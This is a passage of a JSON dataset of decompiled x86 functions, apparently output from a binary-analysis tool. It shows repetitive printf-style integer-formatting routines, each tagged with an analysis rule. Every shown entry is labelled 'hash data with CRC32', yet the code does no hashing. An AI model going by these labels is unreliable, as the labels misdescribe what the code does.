arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x0044182c;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x0044182c;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x0044182c:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 1;\n    if (iVar4 == 8) {\n        fcn.00445967(arg_8h_00, var_8h);\n    }\n    else {\n        fcn.004446c1(arg_8h_00);\n    }\n    piVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((piVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (piVar6 = *(in_ECX + 0x30),  *piVar6 != 0x30)))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(piVar6 >> 8, 1);\n}\n",
        "token_count": 1236
    },
    "004418dd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004418dd(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int16_t *piVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x004419be;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x004419be;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x004419be:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 1;\n    if (iVar4 == 8) {\n        fcn.004459ee(arg_8h_00, var_8h);\n    }\n    else {\n        fcn.00444734(arg_8h_00);\n    }\n    piVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((piVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (piVar6 = *(in_ECX + 0x30),  *piVar6 != 0x30)))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(piVar6 >> 8, 1);\n}\n",
        "token_count": 1231
    },
    "00441a6f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00441a6f(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_8h_00;\n    uint32_t *puVar4;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = fcn.0045027c(*(in_ECX + 0x28));\n    var_8h = 0;\n    var_4h = 0;\n    if (iVar2 == 1) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043db1f(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043d861(&var_8h);\n        }\n    }\n    else if (iVar2 == 2) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e1ed(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043dddd(&var_8h);\n        }\n    }\n    else if (iVar2 == 4) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e762(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043e499(&var_8h);\n        }\n    }\n    else {\n        if (iVar2 != 8) {\n            iVar2 = *(in_ECX + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043f902(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043f614(&var_8h);\n        }\n    }\n    puVar4 = in_ECX + 0x1c;\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.0044ac54();\n    if (cVar1 != '\\0') {\n        uVar3 = *puVar4;\n        arg_8h_00 = var_8h;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_4h < 1)) && (var_4h < 0)) {\n            var_4h = -(var_4h + (var_8h != 0));\n            uVar3 = uVar3 | 0x40;\n            *puVar4 = uVar3;\n            arg_8h_00 = -var_8h;\n        }\n        if (*(in_ECX + 0x24) < 0) {\n            *(in_ECX + 0x24) = 1;\n        }\n        else {\n            *puVar4 = uVar3 & 0xfffffff7;\n            fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n        }\n        if ((arg_8h_00 | var_4h) == 0) {\n            *puVar4 = *puVar4 & 0xffffffdf;\n        }\n        *(in_ECX + 0x38) = 1;\n        if (iVar2 == 8) {\n            fcn.00445a75(arg_8h_00, var_4h);\n        }\n        else {\n            fcn.004447a7(arg_8h_00);\n        }\n        if (((*puVar4 >> 7 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (**(in_ECX + 0x30) != 0x30)))) {\n            *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n            **(in_ECX + 0x30) = 0x30;\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1039
    },
    "00441c0f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00441c0f(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int16_t *piVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x00441cf0;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x00441cf0;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x00441cf0:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 1;\n    if (iVar4 == 8) {\n        fcn.00445afc(arg_8h_00, var_8h);\n    }\n    else {\n        fcn.0044481a(arg_8h_00);\n    }\n    piVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((piVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (piVar6 = *(in_ECX + 0x30),  *piVar6 != 0x30)))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(piVar6 >> 8, 1);\n}\n",
        "token_count": 1237
    },
    "00441da1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00441da1(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x00441e82;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x00441e82;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x00441e82:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 0;\n    if (iVar4 == 8) {\n        fcn.00445b83(arg_8h_00, var_8h, arg_8h);\n    }\n    else {\n        fcn.0044488d(arg_8h_00, arg_8h);\n    }\n    pcVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((pcVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (pcVar6 = *(in_ECX + 0x30),  *pcVar6 != '0')))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(pcVar6 >> 8, 1);\n}\n",
        "token_count": 1246
    },
    "00441f2e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00441f2e(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_8h_00;\n    uint32_t *puVar4;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = fcn.0045027c(*(in_ECX + 0x28));\n    var_8h = 0;\n    var_4h = 0;\n    if (iVar2 == 1) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043d971(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043d6b3(&var_8h);\n        }\n    }\n    else if (iVar2 == 2) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e03f(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043dc2f(&var_8h);\n        }\n    }\n    else if (iVar2 == 4) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e59f(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043e2fd(&var_8h);\n        }\n    }\n    else {\n        if (iVar2 != 8) {\n            iVar2 = *(in_ECX + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043f733(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043f445(&var_8h);\n        }\n    }\n    puVar4 = in_ECX + 0x1c;\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.0044ac12();\n    if (cVar1 != '\\0') {\n        uVar3 = *puVar4;\n        arg_8h_00 = var_8h;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_4h < 1)) && (var_4h < 0)) {\n            var_4h = -(var_4h + (var_8h != 0));\n            uVar3 = uVar3 | 0x40;\n            *puVar4 = uVar3;\n            arg_8h_00 = -var_8h;\n        }\n        if (*(in_ECX + 0x24) < 0) {\n            *(in_ECX + 0x24) = 1;\n        }\n        else {\n            *puVar4 = uVar3 & 0xfffffff7;\n            fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n        }\n        if ((arg_8h_00 | var_4h) == 0) {\n            *puVar4 = *puVar4 & 0xffffffdf;\n        }\n        *(in_ECX + 0x38) = 0;\n        if (iVar2 == 8) {\n            fcn.00445c2a(arg_8h_00, var_4h, arg_8h);\n        }\n        else {\n            fcn.00444914(arg_8h_00, arg_8h);\n        }\n        if (((*puVar4 >> 7 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (**(in_ECX + 0x30) != '0')))) {\n            *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n            **(in_ECX + 0x30) = 0x30;\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1055
    },
    "004420ca": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004420ca(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x004421ab;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x004421ab;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x004421ab:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 0;\n    if (iVar4 == 8) {\n        fcn.00445cd1(arg_8h_00, var_8h, arg_8h);\n    }\n    else {\n        fcn.0044499b(arg_8h_00, arg_8h);\n    }\n    pcVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((pcVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (pcVar6 = *(in_ECX + 0x30),  *pcVar6 != '0')))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(pcVar6 >> 8, 1);\n}\n",
        "token_count": 1242
    },
    "00442257": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00442257(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x00442338;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x00442338;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x00442338:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 0;\n    if (iVar4 == 8) {\n        fcn.00445d78(arg_8h_00, var_8h, arg_8h);\n    }\n    else {\n        fcn.00444a22(arg_8h_00, arg_8h);\n    }\n    pcVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((pcVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (pcVar6 = *(in_ECX + 0x30),  *pcVar6 != '0')))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(pcVar6 >> 8, 1);\n}\n",
        "token_count": 1242
    },
    "004423e4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004423e4(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_8h_00;\n    uint32_t *puVar4;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = fcn.0045027c(*(in_ECX + 0x28));\n    var_8h = 0;\n    var_4h = 0;\n    if (iVar2 == 1) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043da00(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043d742(&var_8h);\n        }\n    }\n    else if (iVar2 == 2) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e0ce(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043dcbe(&var_8h);\n        }\n    }\n    else if (iVar2 == 4) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e635(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043e386(&var_8h);\n        }\n    }\n    else {\n        if (iVar2 != 8) {\n            iVar2 = *(in_ECX + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043f7cd(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043f4df(&var_8h);\n        }\n    }\n    puVar4 = in_ECX + 0x1c;\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.0044ac28();\n    if (cVar1 != '\\0') {\n        uVar3 = *puVar4;\n        arg_8h_00 = var_8h;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_4h < 1)) && (var_4h < 0)) {\n            var_4h = -(var_4h + (var_8h != 0));\n            uVar3 = uVar3 | 0x40;\n            *puVar4 = uVar3;\n            arg_8h_00 = -var_8h;\n        }\n        if (*(in_ECX + 0x24) < 0) {\n            *(in_ECX + 0x24) = 1;\n        }\n        else {\n            *puVar4 = uVar3 & 0xfffffff7;\n            fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n        }\n        if ((arg_8h_00 | var_4h) == 0) {\n            *puVar4 = *puVar4 & 0xffffffdf;\n        }\n        *(in_ECX + 0x38) = 0;\n        if (iVar2 == 8) {\n            fcn.00445e1f(arg_8h_00, var_4h, arg_8h);\n        }\n        else {\n            fcn.00444aa9(arg_8h_00, arg_8h);\n        }\n        if (((*puVar4 >> 7 